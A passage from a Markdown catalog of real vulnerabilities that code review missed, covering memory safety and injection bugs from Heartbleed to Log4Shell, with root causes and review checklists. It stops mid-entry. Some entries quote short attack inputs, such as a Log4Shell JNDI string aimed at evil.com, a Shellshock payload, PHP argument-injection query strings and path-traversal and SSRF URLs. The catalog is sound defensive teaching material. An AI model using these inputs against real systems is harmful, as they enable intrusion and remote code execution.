# Bugs Missed in Code Review: The 200 That Slipped Through

A catalog of real-world bugs from major open source projects that were NOT caught during
code review and required post-release patches, security disclosures, or emergency responses.
Each entry includes the technical root cause, why review failed, and which review pattern
would have caught it.

---

## Memory Safety (40 entries)

### M1. Heartbleed — OpenSSL (CVE-2014-0160)
**Project:** OpenSSL | **Severity:** Critical | **Discovered:** 2014
**The Bug:** The TLS heartbeat extension handler read the payload length from the
attacker-controlled heartbeat request rather than deriving it from the actual received
data length. This allowed an attacker to request up to 64KB of server memory per request.
```c
/* Vulnerable code: trusts client-supplied length */
unsigned int payload = 18; /* from attacker packet */
memcpy(bp, pl, payload); /* reads past buffer */
```
**Root Cause:** Missing bounds check — the code trusted a client-supplied length field
without verifying it against the actual received packet size.
**Why Missed:** The heartbeat extension was contributed by a single developer and reviewed
minimally. The code appeared straightforward — just "read length, copy payload" — and the
missing check was a sin of omission, not a visibly wrong line.
**Review Pattern:** BOUNDS_CHECK — "Does every length/size value from external input get
validated against the actual buffer size before use?"

### M2. Sudo Heap Overflow — sudo (CVE-2021-3156)
**Project:** sudo | **Severity:** Critical | **Discovered:** 2021 (present since 2011)
**The Bug:** An off-by-one error in the sudoers policy parsing code when handling
backslash-escaped characters in command arguments. The parser would write one byte past
the end of a heap buffer when processing a trailing backslash.
**Root Cause:** The size calculation for the heap buffer didn't account for the extra
character needed when a backslash appeared at the end of a token, while the copy loop did
process it — classic allocation/usage size mismatch.
**Why Missed:** The vulnerable code had been stable for 10 years. The off-by-one existed in
a parsing loop with complex escape-handling logic. Size calculation and usage were in
separate code blocks, making the mismatch non-obvious.
**Review Pattern:** ALLOC_USE_MATCH — "When code calculates a buffer size separately from
the code that fills it, do both paths handle every edge case identically?"

### M3. Polkit pkexec — polkit (CVE-2021-4034)
**Project:** polkit | **Severity:** Critical | **Discovered:** 2022 (present since 2009)
**The Bug:** pkexec didn't handle argc==0. When called with an empty argv, the code read
argv[1] which was actually envp[0], allowing environment variable manipulation for
privilege escalation.
**Root Cause:** The code assumed argc >= 1, which is true for normal execution but not when
execve() is called with an empty argv array. The first loop iteration read past argv into
the environment pointer array.
**Why Missed:** The argc==0 case is extremely unusual — almost never occurs in practice.
The assumption "argv always has at least one element" is practically universal and rarely
questioned. The code looked correct for all normal inputs.
**Review Pattern:** ARGV_EDGE — "Does the code handle argc==0 and empty/null argv? Does it
validate array indices before dereferencing?"

### M4. curl SOCKS5 Heap Overflow — curl (CVE-2023-38545)
**Project:** curl/libcurl | **Severity:** High | **Discovered:** 2023
**The Bug:** When a SOCKS5 proxy was configured to resolve hostnames, curl could overflow a
heap buffer if the hostname was longer than 255 bytes. The code switched from local to proxy
hostname resolution under certain slow-connection conditions, and the proxy-resolution path
had a smaller buffer.
**Root Cause:** Two different code paths handled hostname resolution with different buffer
size assumptions. A fallback path switched resolution mode but didn't re-validate the
hostname length against the new, smaller buffer limit.
**Why Missed:** The bug required a specific sequence: SOCKS5 proxy + long hostname + slow
connection triggering a fallback. The two resolution paths were implemented at different
times, and the interaction between them wasn't obvious from reading either path alone.
**Review Pattern:** PATH_INTERACTION — "When multiple code paths converge on a shared
buffer or resource, does each path validate its own constraints independently?"

### M5. glibc GHOST — glibc (CVE-2015-0235)
**Project:** glibc | **Severity:** High | **Discovered:** 2015 (present since 2000)
**The Bug:** Buffer overflow in __nss_hostname_digits_dots(), called by gethostbyname().
The function allocated a buffer based on an incorrect size calculation that didn't account
for all the data that would be written to it.
**Root Cause:** The size_needed calculation missed one of the pointers that was stored in
the buffer, leading to a 4/8 byte overflow depending on architecture.
**Why Missed:** gethostbyname was considered legacy API. The allocation arithmetic was
complex, involving alignment calculations across multiple variables. The off-by-one in
pointer counting was buried in dense allocation math.
**Review Pattern:** ALLOC_ARITHMETIC — "In complex buffer size calculations, does the
arithmetic account for every field, pointer, alignment pad, and null terminator that will
be written?"

### M6. Stagefright — Android libstagefright (CVE-2015-1538)
**Project:** Android | **Severity:** Critical | **Discovered:** 2015
**The Bug:** Integer overflow in MPEG4 metadata parsing. When parsing certain atom types,
the size field could overflow when multiplied, leading to a small allocation followed by a
large memcpy that overwrote heap memory.
**Root Cause:** `size = num_entries * entry_size` could overflow to a small value when
num_entries was attacker-controlled. The subsequent allocation was small, but the copy loop
iterated num_entries times.
**Why Missed:** The integer overflow was non-obvious because both operands appeared
reasonable individually. The multiplication overflow only occurs with specific large values.
Media parsing code was complex and reviewed primarily for functionality, not security.
**Review Pattern:** INT_OVERFLOW_ALLOC — "Does any arithmetic involving attacker-controlled
values get checked for overflow BEFORE being used as an allocation size?"

### M7. OpenSSH regreSSHion — OpenSSH (CVE-2024-6387)
**Project:** OpenSSH | **Severity:** High | **Discovered:** 2024 (regression from 2006 fix)
**The Bug:** A race condition in sshd's SIGALRM handler. When a client didn't authenticate
within LoginGraceTime, the signal handler called syslog() — which is not async-signal-safe.
This was a regression of CVE-2006-5051, reintroduced when logging code was refactored in
OpenSSH 8.5p1 (October 2020).
**Root Cause:** During a refactoring of the logging infrastructure, a `#ifdef
DO_LOG_SAFE_IN_SIGHAND` guard was removed from the sigdie() function, making it unsafe to
call from signal context again — silently reintroducing a bug fixed 14 years earlier.
**Why Missed:** The refactoring appeared to be a straightforward cleanup. The removed ifdef
didn't look security-relevant in isolation. No regression test existed for the original
CVE-2006-5051 fix. Signal handler safety rules are subtle and not enforced by compilers.
**Review Pattern:** REGRESSION_GUARD — "Does this refactoring touch code that was previously
patched for a security issue? Are there regression tests for past CVEs?"

### M8. OpenSSL X.509 Buffer Overflow — OpenSSL (CVE-2022-3602)
**Project:** OpenSSL | **Severity:** High | **Discovered:** 2022
**The Bug:** A stack buffer overflow in X.509 certificate name constraint checking when
processing email addresses with punycode. The overflow occurred during punycode decoding of
internationalized domain names.
**Root Cause:** The punycode decoder didn't properly bound-check output when converting
encoded characters, allowing a 4-byte overflow on the stack.
**Why Missed:** Punycode decoding is complex algorithmic code. The overflow only occurred
with specific internationalized email addresses in certificate name constraints — an
unusual and rarely-tested code path.
**Review Pattern:** CODEC_BOUNDS — "In encoding/decoding routines (base64, punycode, UTF-8,
URL-encoding), does the output buffer size account for worst-case expansion?"

### M9. ImageTragick — ImageMagick (CVE-2016-3714)
**Project:** ImageMagick | **Severity:** Critical | **Discovered:** 2016
**The Bug:** Insufficient filtering of shell metacharacters in filenames passed to delegate
commands. ImageMagick uses external programs (delegates) for certain file formats, and
filenames were passed to shell commands without proper escaping.
**Root Cause:** The filename sanitization used an incomplete blocklist that didn't cover all
shell metacharacters. Characters like `|`, backticks, and `$(...)` could be used in
crafted filenames to inject shell commands.
**Why Missed:** The delegate mechanism was a deeply embedded feature. The sanitization code
existed but was incomplete. Reviewers would see "there is sanitization" and not enumerate
every possible shell metacharacter that could bypass it.
**Review Pattern:** SHELL_ESCAPE — "When constructing shell commands with external data, is
the escaping complete? Better: does the code avoid shell interpolation entirely (use
execvp, not system)?"

### M10. SQLite Memory Safety — SQLite (various CVEs)
**Project:** SQLite | **Severity:** Various | **Discovered:** Ongoing
**The Bug:** Multiple memory safety issues including buffer overflows in the FTS (full-text
search) module, virtual table implementations, and SQL expression parsing.
**Root Cause:** C string handling in complex SQL parsing paths with deeply nested
expressions exceeding expected bounds.
**Why Missed:** SQLite's test coverage is famously thorough (100% branch coverage), but
these bugs existed in edge cases of deeply nested or malformed SQL that tests didn't
exercise. Memory safety issues in C require more than functional correctness testing.
**Review Pattern:** RECURSIVE_DEPTH — "Does recursive or deeply-nested parsing enforce
depth limits to prevent stack/buffer exhaustion?"

### M11. libpng Buffer Overflow — libpng (CVE-2015-8126)
**Project:** libpng | **Severity:** High | **Discovered:** 2015
**The Bug:** Buffer overflow when processing PNG images with a bit depth smaller than 8 in
the png_set_PLTE and png_get_PLTE functions.
**Root Cause:** The code used the palette size from the PLTE chunk without validating it
against the maximum allowed for the given bit depth.
**Why Missed:** The relationship between bit depth and maximum palette size is specified in
the PNG standard but wasn't enforced in code. The constraint was implicit knowledge.
**Review Pattern:** SPEC_CONSTRAINT — "Does the code enforce ALL constraints from the
relevant specification/standard, not just the ones needed for happy-path functionality?"

### M12. Linux Kernel Netfilter UAF — Linux kernel (CVE-2022-25636)
**Project:** Linux kernel | **Severity:** High | **Discovered:** 2022
**The Bug:** A use-after-free in the netfilter subsystem's nf_tables component. A race
between rule evaluation and rule deletion could cause the kernel to access freed memory.
**Root Cause:** Missing RCU synchronization between the packet processing path (which reads
rules) and the control path (which can delete rules).
**Why Missed:** The RCU usage pattern was correct for most paths but missed one specific
sequence of operations. Concurrency bugs in kernel subsystems require understanding the
full lifecycle of every object accessed under RCU.
**Review Pattern:** OBJECT_LIFECYCLE — "For every pointer dereference, is the referenced
object guaranteed to be alive? What prevents it from being freed concurrently?"

### M13. Chrome V8 Type Confusion — Chromium (multiple CVEs)
**Project:** Chromium/V8 | **Severity:** Critical | **Discovered:** Ongoing
**The Bug:** Type confusion bugs in V8's optimizing compiler (TurboFan/Maglev). The JIT
compiler makes type assumptions during optimization that can be invalidated by runtime
behavior, leading to incorrect machine code that accesses memory with wrong type assumptions.
**Root Cause:** JavaScript's dynamic typing means the JIT must speculate about types. When
speculation guards are incomplete or missing, the generated code can treat an object as a
different type, enabling memory corruption.
**Why Missed:** JIT compiler correctness is extraordinarily difficult to verify by review.
The type system, optimization passes, and deoptimization bailouts form a complex state
machine. Each pass assumes invariants established by prior passes, and violations are subtle.
**Review Pattern:** SPECULATIVE_SAFETY — "In optimizing compilers: for every type
assumption/speculation, is there a corresponding guard/bailout? Can the guard be bypassed?"

### M14. Firefox DOM Use-After-Free — Firefox (multiple CVEs)
**Project:** Firefox | **Severity:** High-Critical | **Discovered:** Ongoing
**The Bug:** Use-after-free vulnerabilities in DOM manipulation code, typically triggered by
JavaScript that modifies the DOM tree during certain lifecycle callbacks, causing the engine
to access DOM nodes that have been freed.
**Root Cause:** Complex reference counting in C++ DOM implementation where certain
sequences of JavaScript operations could drop all references to a node while C++ code still
held a raw pointer to it.
**Why Missed:** The interaction between JavaScript garbage collection and C++ reference
counting creates subtle ownership edges. The vulnerable sequences often involved multiple
JavaScript callbacks triggered during a single DOM operation.
**Review Pattern:** RAW_PTR_LIFETIME — "Does any raw pointer outlive the reference-counted
or garbage-collected object it points to? What prevents the object from being collected
while the raw pointer is live?"

### M15. Redis RESP Protocol Issues — Redis (various)
**Project:** Redis | **Severity:** Medium-High | **Discovered:** Various
**The Bug:** Various buffer handling issues in the RESP (Redis Serialization Protocol)
parser, including incorrect handling of bulk strings with manipulated length fields.
**Root Cause:** The protocol parser trusted certain length fields from the wire without
comprehensive validation against maximum sizes and available memory.
**Why Missed:** RESP is a simple protocol, creating false confidence. The edge cases
involved extreme or negative lengths that normal clients never send.
**Review Pattern:** PROTOCOL_LENGTHS — "Does every length field read from a network protocol
get validated for both upper bounds and signedness before use?"

### M16. zlib Heap Overflow — zlib (CVE-2022-37434)
**Project:** zlib | **Severity:** Critical | **Discovered:** 2022
**The Bug:** Heap buffer overflow in inflate.c when handling a large gzip header extra field.
The code used an unsigned comparison that could underflow, skipping the length check entirely.
**Root Cause:** `if (copy > have) copy = have;` used unsigned arithmetic where `have`
could underflow to a very large value, bypassing the bounds check.
**Why Missed:** The underflow required a specific sequence of partial reads of the gzip
header. The unsigned comparison looked correct at surface level but failed when `have` wrapped.
**Review Pattern:** UNSIGNED_UNDERFLOW — "Can any unsigned arithmetic underflow to a large
value? Do comparisons remain correct at boundary values (especially zero)?"

### M17. PHP Argument Injection — PHP (CVE-2012-1823)
**Project:** PHP | **Severity:** Critical | **Discovered:** 2012
**The Bug:** When PHP ran in CGI mode, query string parameters could be interpreted as
command-line arguments to the PHP binary, allowing remote code execution via flags like `-s`
(source display) or `-d` (configuration directives).
**Root Cause:** The CGI SAPI didn't distinguish between query string parameters and command-
line arguments in certain configurations, allowing attackers to pass arguments like
`?-s` or `?-d+allow_url_include=1+-d+auto_prepend_file=php://input`.
**Why Missed:** The interaction between web server query string handling and C-level argument
parsing was an architectural blind spot. Each component worked correctly in isolation.
**Review Pattern:** CONTEXT_CROSSING — "When data crosses a context boundary (web→CLI,
user→kernel, text→SQL), does the receiving context apply its own validation, or does it
inherit trust from the sending context?"

### M18. nginx Alias Traversal — nginx (misconfiguration pattern)
**Project:** nginx | **Severity:** High | **Discovered:** Recurring pattern
**The Bug:** When an nginx `location` directive doesn't end with `/` but the corresponding
`alias` does, path traversal becomes possible:
```nginx
location /images {
    alias /var/www/images/;
}
# Request: /images../etc/passwd → /var/www/images/../etc/passwd → /var/www/etc/passwd
```
**Root Cause:** nginx's alias directive performs simple string replacement. Without the
trailing slash on the location, the path portion after the match isn't constrained to start
with a path separator.
**Why Missed:** This is a configuration footgun, not a code bug. The behavior is documented
but surprising. The missing trailing slash seems cosmetic, not security-relevant.
**Review Pattern:** CONFIG_SYMMETRY — "In path-based configuration, are location/route
prefixes and their filesystem targets consistently terminated? Does string replacement
produce only intended paths?"

### M19. Linux Kernel Stack Overflow via Netlink — Linux kernel (multiple CVEs)
**Project:** Linux kernel | **Severity:** High | **Discovered:** Various
**The Bug:** Stack buffer overflows in netlink message handling, where deeply nested
attributes could exhaust stack space or overflow fixed-size buffers.
**Root Cause:** Netlink attribute parsing used recursive descent without depth limits.
Kernel stack space is limited (typically 8KB), making recursive parsing dangerous.
**Why Missed:** Each individual recursion level looked correct. The overflow only occurred
with pathological nesting depths that normal userspace tools never produce.
**Review Pattern:** KERNEL_STACK — "Does any recursive parsing in kernel context enforce a
depth limit? Kernel stacks are small — can an attacker control recursion depth?"

### M20. Chromium PDFium Memory Safety — Chromium (multiple CVEs)
**Project:** Chromium/PDFium | **Severity:** High | **Discovered:** Ongoing
**The Bug:** Multiple memory safety issues in the PDF renderer, including use-after-free in
annotation handling, buffer overflows in font parsing, and type confusion in JavaScript
actions within PDFs.
**Root Cause:** PDF is an extraordinarily complex format with embedded JavaScript, fonts,
annotations, and cross-references. The attack surface is massive, and each feature adds
potential for memory safety bugs.
**Why Missed:** The PDF specification is thousands of pages. Each feature interaction can
create new vulnerability classes. The sheer volume of parsing code makes exhaustive manual
review impractical.
**Review Pattern:** PARSER_COMPLEXITY — "For complex format parsers, are sub-parsers isolated
(sandboxed, fuzzed independently)? Does each sub-parser validate its input independently?"

### M21-M40. Additional Memory Safety Bugs

### M21. Apache Struts ClassLoader Manipulation (CVE-2014-0094)
**Project:** Apache Struts | **Discovered:** 2014
**The Bug:** ClassLoader manipulation via parameter names. Struts allowed setting internal
class properties through HTTP parameters, enabling classloader manipulation.
**Root Cause:** Unrestricted parameter-to-property mapping without blocklisting internal
Java object properties. Attackers could set `class.classLoader` properties via crafted
HTTP parameters.
**Why Missed:** The OGNL expression language feature was seen as convenient, not dangerous.
The bridge between HTTP parameters and Java object graphs wasn't analyzed for security.
**Review Pattern:** MASS_ASSIGNMENT — "Can external input set arbitrary object properties?
Is there an allowlist (not blocklist) for which properties can be set?"

### M22. Git Credential Helper Injection (CVE-2020-5260)
**Project:** Git | **Severity:** High | **Discovered:** 2020
**The Bug:** Specially crafted URLs with embedded newlines could inject additional credential
protocol lines, potentially leaking credentials to the wrong host.
**Root Cause:** The credential helper protocol uses a newline-delimited text format, and
URLs containing encoded newlines weren't sanitized before being passed to credential helpers.
**Why Missed:** URL parsing and credential passing were in separate modules. The URL spec
technically allows percent-encoded newlines, but the credential protocol interprets them.
**Review Pattern:** DELIMITER_INJECTION — "Can attacker-controlled data contain the
delimiter used by the receiving protocol/format (newlines, nulls, semicolons)?"

### M23. Node.js HTTP Request Smuggling (multiple CVEs)
**Project:** Node.js | **Severity:** High | **Discovered:** Various
**The Bug:** The HTTP parser (http_parser, later llhttp) accepted certain malformed requests
that proxy servers would interpret differently, enabling request smuggling.
**Root Cause:** Different HTTP implementations disagree on edge cases: chunked encoding with
spaces, double Content-Length headers, line folding in headers. Node's parser was more
permissive than proxies in front of it.
**Why Missed:** Each parser was internally consistent. The bugs only manifest when two
different parsers disagree about message boundaries.
**Review Pattern:** PARSER_AGREEMENT — "When data passes through multiple parsers (proxy →
app, browser → server), will all parsers interpret it identically? Prefer strict parsing."

### M24. Python pickle Deserialization — Python (design issue)
**Project:** Python stdlib | **Severity:** Critical | **Discovered:** Ongoing pattern
**The Bug:** Python's pickle module can deserialize arbitrary Python objects, including
those with `__reduce__` methods that execute arbitrary code during deserialization.
**Root Cause:** pickle was designed for convenience, not safety. The serialization format
includes opcodes for importing and calling arbitrary Python functions.
**Why Missed:** pickle is in the standard library and feels "safe" to use. The danger isn't
a bug but a feature — the documentation warns about untrusted data, but many developers
don't read those warnings.
**Review Pattern:** DESERIALIZE_TRUST — "Is deserialization input from a trusted source? For
any format that can trigger code execution (pickle, YAML with !!python, Java
serialization), is the trust boundary correctly identified?"

### M25. Java Deserialization via Commons Collections
**Project:** Apache Commons Collections | **Severity:** Critical | **Discovered:** 2015
**The Bug:** A "gadget chain" in Commons Collections allowed arbitrary code execution when
an application deserialized untrusted Java objects. The InvokerTransformer class could be
chained to execute arbitrary Runtime.exec() calls.
**Root Cause:** Java serialization reinstantiates full object graphs, and classes with
dangerous functionality in their readObject() or related methods can be composed into
exploit chains.
**Why Missed:** The individual classes were innocuous — each did one simple thing. The
vulnerability emerged from chaining multiple benign transformers. No single line of code
was "wrong."
**Review Pattern:** GADGET_CHAIN — "Does this class have side effects during deserialization
(readObject, readResolve, finalize)? Could it be composed with other classes to achieve
unexpected effects?"

### M26. Spring4Shell — Spring Framework (CVE-2022-22965)
**Project:** Spring Framework | **Severity:** Critical | **Discovered:** 2022
**The Bug:** Similar to Struts ClassLoader issue — Spring's data binding allowed setting
nested properties on Java objects via HTTP parameters, including accessing the class loader
through the `class` property.
**Root Cause:** The data binding mechanism used Java introspection to map request parameters
to object properties without sufficiently restricting which properties could be set.
**Why Missed:** Spring had fixed a similar issue in 2010 (CVE-2010-1622) but the fix was
bypassed on JDK 9+ due to changes in the module system that exposed new property paths.
**Review Pattern:** FIX_BYPASS — "Could this security fix be bypassed by a different entry
point, a newer runtime version, or a change in an underlying dependency?"

### M27. Drupalgeddon — Drupal (CVE-2014-3704)
**Project:** Drupal | **Severity:** Critical | **Discovered:** 2014
**The Bug:** SQL injection in the database abstraction layer. The expandArguments()
function constructed SQL IN clauses from arrays, but PHP's ability to pass arrays via
HTTP parameters meant an attacker could inject arbitrary SQL.
**Root Cause:** The database abstraction layer assumed that array keys in prepared statement
parameters would be integers, but PHP allows arbitrary string keys via HTTP parameters like
`name[0 OR 1=1]=value`.
**Why Missed:** The SQL parameterization looked correct — it used prepared statements. The
vulnerability was in how parameter placeholders were dynamically constructed from array
keys, a level of indirection reviewers wouldn't normally inspect.
**Review Pattern:** PREPARED_STATEMENT_CONSTRUCTION — "Are SQL prepared statements truly
parameterized, or are parts of the query dynamically constructed from user input before
parameterization?"

### M28. Apache Struts OGNL Injection (CVE-2017-5638)
**Project:** Apache Struts | **Severity:** Critical | **Discovered:** 2017 (Equifax breach)
**The Bug:** The Jakarta Multipart parser's error handling evaluated user-controlled strings
as OGNL expressions. A malformed Content-Type header triggered an error message that was
processed through the OGNL expression evaluator.
**Root Cause:** Error messages containing user input were passed through the same expression
evaluation pipeline as legitimate OGNL expressions, allowing code execution via crafted
Content-Type headers.
**Why Missed:** The error-handling path was different from the main request processing path.
The fact that error messages also went through OGNL evaluation was an implementation detail
buried in the framework's internals.
**Review Pattern:** ERROR_PATH_TRUST — "Do error-handling and exception paths apply the same
input validation as the happy path? Is user input in error messages treated as data, not
as code?"

### M29. XXE in Java XML Parsers — Multiple projects
**Project:** Various Java projects | **Severity:** High | **Discovered:** Ongoing pattern
**The Bug:** XML External Entity injection through Java's default XML parser configuration,
which enables external entity resolution by default. Parsing attacker-controlled XML could
read local files, perform SSRF, or cause denial of service.
**Root Cause:** Java's XML parsers have dangerous defaults — external entity resolution,
DTD processing, and XInclude are all enabled unless explicitly disabled.
**Why Missed:** The default behavior "just works" for legitimate XML. The dangerous features
are invisible unless you know to look for them. Code like `DocumentBuilderFactory.
newInstance().newDocumentBuilder().parse(input)` looks correct but is vulnerable.
**Review Pattern:** DANGEROUS_DEFAULTS — "Does this API have secure defaults, or must
security features be explicitly enabled? Check: XML parsers, CORS, CSP, TLS versions,
cookie flags, serialization."

### M30. SSRF via URL Parsing Differences — Multiple projects
**Project:** Various | **Severity:** High | **Discovered:** Ongoing pattern
**The Bug:** Server-Side Request Forgery enabled by differences between URL validation
and URL fetching libraries. A URL that passes validation as "external" is interpreted
differently by the HTTP client, reaching internal services.
**Root Cause:** URL parsing is ambiguous. `http://evil.com@internal:8080`,
`http://127.0.0.1:80\@evil.com`, and `http://0x7f000001` all reach localhost but may pass
validation filters that check for "evil.com" as the host.
**Why Missed:** URL validation appears to work for normal URLs. The discrepancies only
manifest with adversarial inputs that exploit parsing ambiguities.
**Review Pattern:** URL_CANONICALIZATION — "Is URL validation performed by the same library
that fetches the URL? Are all representations of localhost/internal IPs blocked?"

### M31. Grafana Authentication Bypass (CVE-2021-43798)
**Project:** Grafana | **Severity:** High | **Discovered:** 2021
**The Bug:** Path traversal via plugin routes. The URL path `/public/plugins/<plugin>/`
allowed traversal with `../../` sequences to read arbitrary files.
**Root Cause:** Plugin route handling stripped the plugin prefix but didn't fully
canonicalize the remaining path before using it for file access.
**Why Missed:** The traversal bypassed middleware that normally prevented such access. The
plugin route handler had its own path processing that didn't apply the same sanitization.
**Review Pattern:** MIDDLEWARE_BYPASS — "Can any route bypass security middleware? Are there
alternative paths (plugins, static files, health checks) that skip authentication?"

### M32. Apache HTTP Path Traversal (CVE-2021-41773 / CVE-2021-42013)
**Project:** Apache HTTP Server | **Severity:** Critical | **Discovered:** 2021
**The Bug:** Path traversal via URL-encoded dot sequences. The normalization function
decoded `%2e` but not double-encoded `%%32%65`, allowing traversal with `.%2e/` sequences.
The first fix (2.4.50) was incomplete, leading to CVE-2021-42013.
**Root Cause:** Single-pass URL decoding in path normalization. The function decoded once
but didn't re-validate after decoding, allowing double-encoded sequences to bypass checks.
**Why Missed:** The normalization code decoded and validated in a single pass, which seems
efficient. The multi-encoding bypass requires understanding that data can be encoded
multiple times and that a single decode pass is insufficient.
**Review Pattern:** MULTI_ENCODING — "Does path/URL normalization decode recursively or in
a loop until stable? After decoding, is the result re-validated? Can double-encoding bypass
the check?"

### M33. Jenkins Script Console Access — Jenkins (multiple CVEs)
**Project:** Jenkins | **Severity:** Critical | **Discovered:** Various
**The Bug:** Multiple authentication and authorization bypass issues in Jenkins, including
unauthenticated access to the Groovy script console which allows arbitrary code execution.
**Root Cause:** Jenkins' access control model evolved incrementally, with new features
sometimes added without proper authentication checks. The script console's immense power
made any auth bypass catastrophic.
**Why Missed:** Jenkins has a complex permission model with multiple layers. New endpoints
or features could inadvertently skip authentication checks in the filter chain.
**Review Pattern:** NEW_ENDPOINT_AUTH — "Does every new endpoint/route have explicit
authentication and authorization checks? Is there a test that unauthenticated access to
every endpoint returns 401/403?"

### M34. Docker Socket Exposure — Docker
**Project:** Docker | **Severity:** Critical | **Discovered:** Ongoing pattern
**The Bug:** Applications mounting the Docker socket (`/var/run/docker.sock`) into containers
grant the container full control over the Docker daemon, equivalent to root access on host.
**Root Cause:** The Docker socket provides unauthenticated, unrestricted API access to the
daemon. Mounting it into a container breaks the container isolation boundary entirely.
**Why Missed:** The Docker socket mount is a common pattern in CI/CD, monitoring, and
container management tools. It "works" and solves real problems, making it easy to overlook
the security implications.
**Review Pattern:** PRIVILEGE_MOUNT — "Does any container mount grant access to host control
planes (Docker socket, kubelet, /proc, /sys)? This is equivalent to disabling isolation."

### M35. Kubernetes RBAC Defaults — Kubernetes
**Project:** Kubernetes | **Severity:** High | **Discovered:** Ongoing pattern
**The Bug:** Default RBAC configurations in many Kubernetes deployments granted excessive
permissions, including the `system:authenticated` group having broad access, and service
accounts getting auto-mounted tokens they didn't need.
**Root Cause:** Kubernetes defaulted to convenience over security — auto-mounting service
account tokens, granting discovery permissions broadly, and using permissive defaults that
worked for development but were dangerous in production.
**Why Missed:** The defaults work for development and small clusters. The security
implications only become apparent in multi-tenant or internet-facing deployments, which
aren't the usual context for initial review.
**Review Pattern:** LEAST_PRIVILEGE — "Does this deployment/configuration grant more
permissions than required? Are credentials auto-provisioned where they aren't needed?"

### M36. MongoDB Default No-Auth — MongoDB
**Project:** MongoDB | **Severity:** Critical | **Discovered:** Ongoing pattern
**The Bug:** MongoDB shipped without authentication enabled by default, binding to all
interfaces. Thousands of MongoDB instances were exposed on the internet without any access
controls, leading to massive data breaches and ransomware campaigns.
**Root Cause:** MongoDB prioritized ease of setup over security. The default configuration
had no authentication and listened on 0.0.0.0.
**Why Missed:** For development and local use, no-auth is convenient. The configuration was
documented but the security implications were not prominent enough in setup guides.
**Review Pattern:** DEFAULT_EXPOSURE — "Does this service's default configuration expose it
to the network without authentication? What happens if deployed without customization?"

### M37. Elasticsearch Default No-Auth — Elasticsearch
**Project:** Elasticsearch | **Severity:** Critical | **Discovered:** Ongoing pattern
**The Bug:** Similar to MongoDB — Elasticsearch had no built-in authentication until
X-Pack/Security was added. Default installations were fully accessible on port 9200.
**Root Cause:** Security was treated as a premium/add-on feature rather than a default.
**Why Missed:** Same pattern as MongoDB — convenient for development, catastrophic in
production when deployed without additional security configuration.
**Review Pattern:** DEFAULT_EXPOSURE (same as M36)

### M38. Redis Default Exposure — Redis
**Project:** Redis | **Severity:** Critical | **Discovered:** Ongoing pattern
**The Bug:** Redis defaulted to no authentication and binding to all interfaces. Combined
with Redis's ability to write files to disk (via CONFIG SET dir/dbfilename and SAVE),
this allowed remote code execution by writing crontab files or SSH keys.
**Root Cause:** Redis was designed as an internal caching layer, not a network-facing
service. The defaults reflected this assumption, but real deployments often exposed it.
**Why Missed:** Redis's file-writing capability was a feature for persistence, but it
becomes an RCE primitive when combined with unauthenticated network access.
**Review Pattern:** FEATURE_INTERACTION — "Can two individually-safe features combine to
create a dangerous capability? (Network access + file write = RCE; eval + user input = injection)"

### M39. OpenSSL CCS Injection (CVE-2014-0224)
**Project:** OpenSSL | **Severity:** High | **Discovered:** 2014
**The Bug:** OpenSSL accepted ChangeCipherSpec messages before the key exchange was
complete. This allowed a man-in-the-middle attacker to force both client and server to
use weak keying material derived from an empty pre-master secret.
**Root Cause:** The SSL state machine didn't enforce proper message ordering. The CCS
message was accepted in states where it shouldn't have been, without checking that the key
exchange had completed.
**Why Missed:** The SSL/TLS state machine is complex, with many valid state transitions.
The incorrect CCS handling had existed since the first release of OpenSSL, suggesting it
was never carefully reviewed against the TLS specification.
**Review Pattern:** STATE_MACHINE — "Does the protocol state machine accept messages only in
the correct states? Are there tests for out-of-order message delivery?"

### M40. Let's Encrypt Boulder Bug — Let's Encrypt (2020)
**Project:** Let's Encrypt Boulder | **Severity:** High | **Discovered:** 2020
**The Bug:** A bug in certificate validation allowed certificates to be issued without
properly checking all domain authorizations when multiple domains were in a single order.
The checking code iterated incorrectly, potentially skipping validation for some domains.
**Root Cause:** A loop that checked domain authorizations had an off-by-one-like logic error
where it could check the same authorization multiple times instead of checking each domain.
**Why Missed:** The authorization checking code was complex, involving multiple arrays and
indices. The bug only manifested when orders contained specific numbers and combinations
of domains.
**Review Pattern:** LOOP_COVERAGE — "Does every iteration of a validation loop check a
unique item? Can any item be skipped or checked multiple times due to index arithmetic?"

---

## Injection & Input Handling (40 entries)

### I1. Log4Shell — Apache Log4j (CVE-2021-44228)
**Project:** Apache Log4j | **Severity:** Critical | **Discovered:** 2021
**The Bug:** Log4j's message lookup substitution feature evaluated JNDI expressions in log
messages. Attacker-controlled strings like `${jndi:ldap://evil.com/a}` in any logged field
triggered JNDI lookups, downloading and executing remote code.
**Root Cause:** The logging framework treated log message content as a template to be
evaluated, not as inert data. JNDI lookup was one of many supported substitution methods,
and JNDI can load remote Java classes.
**Why Missed:** The lookup substitution feature was documented and intentional. The danger
was in the composition: user-controlled strings reaching log statements (extremely common)
combined with JNDI's ability to load remote code. Each feature seemed reasonable in isolation.
**Review Pattern:** LOG_AS_DATA — "Is user-controlled input logged as inert data, or does it
pass through any template/expression evaluation? Logging frameworks should never interpret
logged data as code."

### I2. Shellshock — GNU Bash (CVE-2014-6271)
**Project:** GNU Bash | **Severity:** Critical | **Discovered:** 2014 (present since 1989)
**The Bug:** Bash's function import mechanism (via environment variables) continued parsing
and executing commands after the function definition ended. An environment variable like
`() { :; }; malicious_command` would execute `malicious_command` when any Bash process
was started.
**Root Cause:** The parser that imported function definitions from environment variables
didn't stop after the closing `}` of the function body — it continued executing whatever
followed as commands.
**Why Missed:** Environment variable function import was an obscure feature dating to 1989.
The parser code was old and rarely examined. The vulnerability required understanding that
environment variables could contain executable function definitions — a feature most Bash
users and even developers didn't know existed.
**Review Pattern:** PARSER_TERMINATION — "Does every parser stop cleanly at the end of its
expected input? What happens if additional data follows a valid construct?"

### I3. Apache Struts OGNL RCE (CVE-2017-5638)
**Project:** Apache Struts | **Severity:** Critical | **Discovered:** 2017
(See M28 for full details — the Equifax breach vector)
**Review Pattern:** EXPRESSION_LANGUAGE — "Is user input ever evaluated by an expression
language (OGNL, SpEL, EL, MVEL)? Expression languages with reflection/method-call
capabilities are equivalent to code execution."

### I4. Template Injection — Various frameworks
**Project:** Jinja2, Twig, Handlebars, Thymeleaf | **Severity:** High-Critical
**The Bug:** Server-side template injection (SSTI) when user input is concatenated into
template strings rather than passed as template variables:
```python
# Vulnerable:
render_template_string("Hello " + user_input)
# Safe:
render_template_string("Hello {{name}}", name=user_input)
```
**Root Cause:** Template engines are effectively code interpreters. Passing user input as
part of the template string makes it code; passing it as a variable makes it data.
**Why Missed:** The vulnerable pattern looks almost identical to the safe pattern. Without
understanding the distinction between template source and template data, the concatenation
